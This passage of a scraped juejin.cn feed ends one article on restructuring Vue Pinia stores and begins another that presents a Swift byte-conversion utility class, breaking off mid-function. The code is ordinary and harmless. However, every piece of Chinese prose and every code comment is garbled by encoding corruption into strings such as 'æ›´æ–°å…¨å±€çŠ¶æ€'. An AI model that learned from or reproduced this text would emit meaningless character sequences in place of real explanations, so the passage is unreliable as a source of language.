      store.<span class="hljs-property">currentOrder</span> = result  <span class="hljs-comment">// æ›´æ–°å…¨å±€çŠ¶æ€</span>
      <span class="hljs-keyword">return</span> result
    } <span class="hljs-keyword">finally</span> {
      loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
  }

  <span class="hljs-keyword">return</span> { formData, loading, rules, submit }
}
</code></pre>
<p>Store è´Ÿè´£"æ•°æ®ä»“åº“"ï¼ŒComposable è´Ÿè´£"ä¸šåŠ¡é€»è¾‘"ï¼Œå„å¸å…¶èŒã€‚</p>
<h2 data-id="heading-11">è¿ç§»è¿‡ç¨‹ï¼šæ€ä¹ˆå¹³æ»‘è¿‡æ¸¡</h2>
<p>ä¸å¯èƒ½ä¸€å£æ°”æŠŠæ‰€æœ‰ Store éƒ½é‡å†™ï¼Œé¡¹ç›®è¿˜è¦æ­£å¸¸è¿­ä»£ã€‚æˆ‘é‡‡ç”¨çš„ç­–ç•¥æ˜¯ï¼š</p>
<h3 data-id="heading-12">1. å‘åå…¼å®¹å¯¼å‡º</h3>
<p>æ—§çš„ Store æš‚æ—¶ä¿ç•™ï¼Œæ–°çš„ Store å†™åœ¨åŸŸç›®å½•é‡Œï¼Œç»Ÿä¸€åœ¨ <code>index.ts</code> åšå…¼å®¹å¯¼å‡ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/store/index.ts</span>

<span class="hljs-comment">// æ–°çš„åŸŸå¯¼å‡ºï¼ˆæ¨èä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./core'</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./basicData'</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./search'</span>

<span class="hljs-comment">// å‘åå…¼å®¹ï¼ˆé€æ­¥åºŸå¼ƒï¼‰</span>
<span class="hljs-keyword">export</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./core/user'</span>  <span class="hljs-comment">// æ—§è·¯å¾„çš„ä½¿ç”¨è€…ä¸ä¼šæŠ¥é”™</span>
</code></pre>
<h3 data-id="heading-13">2. é€æ­¥è¿ç§»</h3>
<p>æŒ‰ä¼˜å…ˆçº§åˆ†æ‰¹è¿ç§»ï¼š</p>
<ol>
<li><strong>Week 1-2</strong>ï¼šæ ¸å¿ƒåŸŸï¼ˆuserã€systemã€loadingï¼‰</li>
<li><strong>Week 3-4</strong>ï¼šåŸºç¡€æ•°æ®åŸŸï¼ˆç¼“å­˜ã€å­—å…¸ï¼‰</li>
<li><strong>Week 5-8</strong>ï¼šä¸šåŠ¡åŸŸï¼ˆæŒ‰æ¨¡å—é€ä¸ªè¿ç§»ï¼‰</li>
</ol>
<p>æ¯æ¬¡è¿ç§»å®Œä¸€ä¸ªæ¨¡å—ï¼Œè·‘ä¸€é TypeScript æ£€æŸ¥å’Œ E2E æµ‹è¯•ï¼Œç¡®ä¿æ²¡é—®é¢˜å†ç»§ç»­ã€‚</p>
<h3 data-id="heading-14">3. ESLint è§„åˆ™æŠ¤èˆª</h3>
<p>åŠ äº†å‡ æ¡ ESLint è§„åˆ™ï¼Œé˜²æ­¢"æ–°ä»£ç å†™æˆè€æ ·å­"ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// eslint.config.js</span>
{
  <span class="hljs-attr">files</span>: [<span class="hljs-string">'src/store/**/*.ts'</span>],
  <span class="hljs-attr">rules</span>: {
    <span class="hljs-comment">// ç¦æ­¢åœ¨ Store ä¸­ä½¿ç”¨ any</span>
    <span class="hljs-string">'@typescript-eslint/no-explicit-any'</span>: <span class="hljs-string">'error'</span>,
    <span class="hljs-comment">// å¼ºåˆ¶å¯¼å…¥æ’åº</span>
    <span class="hljs-string">'perfectionist/sort-imports'</span>: <span class="hljs-string">'error'</span>,
  },
}
</code></pre>
<h2 data-id="heading-15">æœ€ç»ˆæ•ˆæœ</h2>
<p>ä¸¤å‘¨åçš„ Store ç›®å½•ï¼š</p>
<ul>
<li>âœ… 6 ä¸ªä¸šåŠ¡åŸŸï¼Œç»“æ„æ¸…æ™°</li>
<li>âœ… 100% Setup é£æ ¼</li>
<li>âœ… 100% TypeScript ç±»å‹è¦†ç›–</li>
<li>âœ… ç»Ÿä¸€çš„æŒä¹…åŒ–ç­–ç•¥</li>
<li>âœ… å®Œå–„çš„ JSDoc æ³¨é‡Š</li>
</ul>
<p>ç»´æŠ¤æˆæœ¬ä»"çœ‹ä¸€çœ¼å°±å¤´ç–¼"å˜æˆäº†"é¡ºæ‰‹å°±èƒ½æ”¹"ã€‚</p>
<h2 data-id="heading-16">ä¸€äº›å¿ƒå¾—</h2>
<ol>
<li><strong>ä¸è¦ä¸€æ­¥åˆ°ä½</strong>ï¼šé‡æ„æœ€æ€•çš„æ˜¯"å¤§è·ƒè¿›"ï¼Œåˆ†æ‰¹è¿ç§»ã€é€æ­¥éªŒè¯æ‰æ˜¯æ­£é“</li>
<li><strong>å‘åå…¼å®¹å¾ˆé‡è¦</strong>ï¼šè€ä»£ç ä¸å¯èƒ½ä¸€å¤œä¹‹é—´éƒ½æ”¹å®Œï¼Œå…¼å®¹å±‚æ˜¯å¿…é¡»çš„</li>
<li><strong>è§„èŒƒå…ˆè¡Œ</strong>ï¼šå…ˆå®šå¥½è§„èŒƒï¼Œå†åŠ¨æ‰‹å†™ä»£ç ï¼Œä¸ç„¶è¿ç§»å®Œäº†åˆæ˜¯ä¸€å¨æ–°çš„å±å±±</li>
<li><strong>Store å’Œ Composable åˆ«æ··ç”¨</strong>ï¼šæƒ³æ¸…æ¥šæ¯ä¸ªä¸œè¥¿çš„èŒè´£ï¼Œåˆ«å›¾æ–¹ä¾¿ä»€ä¹ˆéƒ½å¾€ Store é‡Œå¡</li>
<li><strong>ç±»å‹æ˜¯æ–‡æ¡£</strong>ï¼šå¥½çš„ç±»å‹å®šä¹‰æ¯”æ³¨é‡Šæ›´æœ‰ç”¨ï¼Œ<code>interface</code> å†™æ¸…æ¥šäº†ï¼Œä»£ç è‡ªè§£é‡Š</li>
</ol>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯è¿™æ¬¡ Pinia æ²»ç†çš„å…¨è¿‡ç¨‹ã€‚å¦‚æœä½ ä¹Ÿåœ¨ç»´æŠ¤ä¸€ä¸ª"å†å²æ‚ ä¹…"çš„ Vue é¡¹ç›®ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ç»™ä½ ä¸€äº›å‚è€ƒã€‚</p>
<p>æœ‰é—®é¢˜æ¬¢è¿è¯„è®ºåŒºäº¤æµ ğŸ‘‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool]]></title>    <link>https://juejin.cn/post/7581004702945099803</link>    <guid>https://juejin.cn/post/7581004702945099803</guid>    <pubDate>2025-12-08T03:44:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945099803" data-draft-id="7580753790771445802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T03:44:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tangbin583085"/> <meta itemprop="url" content="https://juejin.cn/user/95026578465675"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/95026578465675/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tangbin583085
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:44:16.000Z" title="Mon Dec 08 2025 03:44:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool è§£æ</h2>
<p>åœ¨åšæ™ºèƒ½ç¡¬ä»¶è“ç‰™ã€Socketã€åè®®è§£æã€ç‰©è”ç½‘è®¾å¤‡é€šè®¯æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸è¦å¤„ç†ï¼š</p>
<ul>
<li>åå…­è¿›åˆ¶å­—ç¬¦ä¸²äº’è½¬Data</li>
<li>å¤§ç«¯ / å°ç«¯æ•´æ•°è½¬æ¢</li>
<li>å­—èŠ‚å€’åº</li>
<li>å¼‚æˆ–æ ¡éªŒ</li>
<li>å®‰å…¨è£å‰ªäºŒè¿›åˆ¶æ•°æ®</li>
</ul>
<p>ä¹‹å‰æˆ‘å†™è¿‡ä¸€ä¸ªã€ŠObjective-C ç‰ˆçš„ ParseDataTool å·¥å…·ç±»ã€‹ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç»™å‡ºå®Œæ•´çš„ Swift ç‰ˆæœ¬å®ç°ï¼Œå¹¶åšäº†ä¸€äº›æ›´â€œSwiftyâ€çš„æ”¹é€ ï¼Œæ›´é€‚åˆä½œä¸º Swift é¡¹ç›®ä¸­çš„é€šç”¨å·¥å…·ç±»ã€‚</p>
<h3 data-id="heading-1">å·¥å…·ç±»æ•´ä½“ç»“æ„</h3>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ª <code>final class ParseDataTool</code> æ¥å°è£…æ‰€æœ‰é™æ€å·¥å…·æ–¹æ³•ï¼Œæ–¹ä¾¿åœ¨é¡¹ç›®ä¸­å…¨å±€è°ƒç”¨ï¼š</p>
<ul>
<li><code>transLittleEndianDataToInteger(_:)</code>ï¼šå°ç«¯ Data â†’ Int</li>
<li><code>convertDataToInteger(_:)</code>ï¼šå¤§ç«¯ Data â†’ Int</li>
<li><code>transDataToHexString(_:)</code>ï¼šData â†’ Hex å­—ç¬¦ä¸²</li>
<li><code>transToData(hexString:)</code>ï¼šHex å­—ç¬¦ä¸² â†’ Data</li>
<li><code>invertedOrder(_:)</code>ï¼šæŒ‰å­—èŠ‚å€’åº</li>
<li><code>convertToDecimal(fromHex:)</code>ï¼šåå…­è¿›åˆ¶å­—ç¬¦ä¸² â†’ åè¿›åˆ¶ Int</li>
<li><code>describeBlankFormat(_:)</code>ï¼š<code>"aabbcc"</code> â†’ <code>"aa bb cc"</code></li>
<li><code>describeBytesFormat(_:)</code>ï¼š<code>"aabbcc"</code> â†’ <code>"0xaa, 0xbb, 0xcc"</code></li>
<li><code>transStringToBigMode(_:)</code>ï¼šæŒ‰å­—èŠ‚å€’åº = å°ç«¯è½¬å¤§ç«¯æ˜¾ç¤º</li>
<li><code>convert(data:)</code>ï¼šData å­—èŠ‚åºç¿»è½¬</li>
<li><code>numswap(_:)</code>ï¼š16 ä½æ•´æ•°å­—èŠ‚äº’æ¢</li>
<li><code>xor(dataString:)</code>ï¼šå­—ç¬¦ä¸²æŒ‰å­—èŠ‚å¼‚æˆ–</li>
<li><code>compareImageData(_:withXORValue:)</code>ï¼šData å¼‚æˆ–ç»“æœå¯¹æ¯”</li>
<li><code>subData(_:range:)</code>ï¼šå®‰å…¨è£å‰ª Dataï¼Œé˜²æ­¢è¶Šç•Œå´©æºƒ</li>
</ul>
<p>å®Œæ•´ Swift ç‰ˆæœ¬ ParseDataTool.swift</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//</span>
<span class="hljs-comment">//  ParseDataTool.swift</span>
<span class="hljs-comment">//  æ•°æ®è½¬æ¢å·¥å…·ç±»ï¼ˆSwiftç‰ˆï¼‰</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//  Created by tb on 2025/12/08.</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">import</span> Foundation

<span class="hljs-comment">/// æ•°æ®è½¬æ¢å·¥å…·ç±»ï¼ˆSwift ç‰ˆæœ¬ï¼‰</span>
<span class="hljs-comment">///</span>
<span class="hljs-comment">/// åŠŸèƒ½ï¼š</span>
<span class="hljs-comment">/// - åå…­è¿›åˆ¶å­—ç¬¦ä¸² â†” Data</span>
<span class="hljs-comment">/// - å¤§ç«¯ / å°ç«¯æ•´æ•°è½¬æ¢</span>
<span class="hljs-comment">/// - å­—èŠ‚å€’åº</span>
<span class="hljs-comment">/// - å¼‚æˆ–æ ¡éªŒ</span>
<span class="hljs-comment">/// - å®‰å…¨è£å‰ª Data</span>
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParseDataTool</span> {
    
    <span class="hljs-comment">// MARK: - åå…­è¿›åˆ¶ä¸æ•´æ•°è½¬æ¢</span>
    
    <span class="hljs-comment">/// å°†å°ç«¯æ¨¡å¼çš„ Data è½¬ä¸º Int32 å¯¹åº”çš„ Int</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼ˆå°ç«¯ï¼‰</span>
    <span class="hljs-comment">/// - Returns: è½¬æ¢åçš„ Int å€¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transLittleEndianDataToInteger</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }
        
        <span class="hljs-keyword">var</span> value: <span class="hljs-type">UInt32</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">let</span> count <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(<span class="hljs-type">MemoryLayout</span>&lt;<span class="hljs-type">UInt32</span>&gt;.size, data.count)
        
        withUnsafeMutableBytes(of: <span class="hljs-operator">&amp;</span>value) { buffer <span class="hljs-keyword">in</span>
            data.copyBytes(to: buffer, count: count)
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-type">Int</span>(<span class="hljs-type">UInt32</span>(littleEndian: value))
    }
    
    <span class="hljs-comment">/// å°†å¤§ç«¯æ¨¡å¼çš„ Data è½¬ä¸º Int32 å¯¹åº”çš„ Int</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼ˆå¤§ç«¯ï¼‰</span>
    <span class="hljs-comment">/// - Returns: è½¬æ¢åçš„ Int å€¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">convertDataToInteger</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }
        
        <span class="hljs-keyword">var</span> value: <span class="hljs-type">UInt32</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">let</span> count <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(<span class="hljs-type">MemoryLayout</span>&lt;<span class="hljs-type">UInt32</span>&gt;.size, data.count)
        
        withUnsafeMutableBytes(of: <span class="hljs-operator">&amp;</span>value) { buffer <span class="hljs-keyword">in</span>
            data.copyBytes(to: buffer, count: count)
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-type">Int</span>(<span class="hljs-type">UInt32</span>(bigEndian: value))
    }
    
    <span class="hljs-comment">// MARK: - åå…­è¿›åˆ¶ä¸å­—ç¬¦ä¸²è½¬æ¢</span>
    
    <span class="hljs-comment">/// å°† Data è½¬ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆå°å†™ï¼‰</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹äºŒè¿›åˆ¶æ•°æ®</span>
    <span class="hljs-comment">/// - Returns: ä¾‹å¦‚ï¼š`&lt;aa bb cc&gt;` -&gt; `"aabbcc"`</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transDataToHexString</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        <span class="hljs-keyword">return</span> data.map { <span class="hljs-type">String</span>(format: <span class="hljs-string">"%02x"</span>, <span class="hljs-variable">$0</span>) }.joined()
    }
    
    <span class="hljs-comment">/// å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸º Data</span>
    <span class="hljs-comment">/// - Parameter hexString: ä¾‹å¦‚ `"1234edaced0204ff23"` æˆ–ä¸­é—´å¸¦ç©ºæ ¼çš„ `"12 34 ed ac"`</span>
    <span class="hljs-comment">/// - Returns: å¯¹åº”çš„ Data</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transToData</span>(<span class="hljs-params">hexString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Data</span> {
        <span class="hljs-keyword">let</span> cleanString <span class="hljs-operator">=</span> hexString.replacingOccurrences(of: <span class="hljs-string">" "</span>, with: <span class="hljs-string">""</span>)
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>cleanString.isEmpty, cleanString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>()
        }
        
        <span class="hljs-keyword">var</span> data <span class="hljs-operator">=</span> <span class="hljs-type">Data</span>(capacity: cleanString.count <span class="hljs-operator">/</span> <span class="hljs-number">2</span>)
        
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> cleanString.startIndex
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> cleanString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> cleanString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byteString <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cleanString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">UInt8</span>(byteString, radix: <span class="hljs-number">16</span>) {
                data.append(byte)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// è§£æå¤±è´¥ï¼Œè¿”å›å½“å‰å·²è§£æéƒ¨åˆ†ï¼ˆä¹Ÿå¯ä»¥é€‰æ‹©ç›´æ¥è¿”å›ç©ºï¼‰</span>
                <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>()
            }
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> data
    }
    
    <span class="hljs-comment">/// å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²æŒ‰ç…§æ¯ 1 å­—èŠ‚ï¼ˆ2 ä¸ªå­—ç¬¦ï¼‰è¿›è¡Œå€’åº</span>
    <span class="hljs-comment">/// - Parameter str: ä¾‹å¦‚ `"a7000003"` -&gt; `"030000a7"`</span>
    <span class="hljs-comment">/// - Returns: å€’åºä¹‹åçš„å­—ç¬¦ä¸²</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">invertedOrder</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">str</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>str.isEmpty, str.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        
        <span class="hljs-keyword">var</span> result <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> str.endIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&gt;</span> str.startIndex {
            <span class="hljs-keyword">let</span> prevIndex <span class="hljs-operator">=</span> str.index(index, offsetBy: <span class="hljs-operator">-</span><span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> str[prevIndex<span class="hljs-operator">..&lt;</span>index]
            result.append(contentsOf: byte)
            index <span class="hljs-operator">=</span> prevIndex
        }
        
        <span class="hljs-keyword">return</span> result
    }
    
    <span class="hljs-comment">/// å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸ºåè¿›åˆ¶ Int</span>
    <span class="hljs-comment">/// - Parameter hexString: ä¾‹å¦‚ `"00a1"` -&gt; 161</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">convertToDecimal</span>(<span class="hljs-params">fromHex</span> <span class="hljs-params">hexString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>hexString.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }
        <span class="hljs-keyword">return</span> <span class="hljs-type">Int</span>(hexString, radix: <span class="hljs-number">16</span>) <span class="hljs-operator">??</span> <span class="hljs-number">0</span>
    }
    
    <span class="hljs-comment">// MARK: - æ ¼å¼åŒ–è¾“å‡ºè¾…åŠ©</span>
    
    <span class="hljs-comment">/// å°†çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸ºå¸¦ç©ºæ ¼æ ¼å¼</span>
    <span class="hljs-comment">/// - Example: `"aabbccdd"` -&gt; `"aa bb cc dd"`</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">describeBlankFormat</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">dataString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>dataString.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        <span class="hljs-keyword">guard</span> dataString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> dataString }
        
        <span class="hljs-keyword">var</span> components: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> dataString.startIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> dataString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> dataString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(dataString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            components.append(byte)
            index <span class="hljs-operator">=</span> nextIndex
        }
        
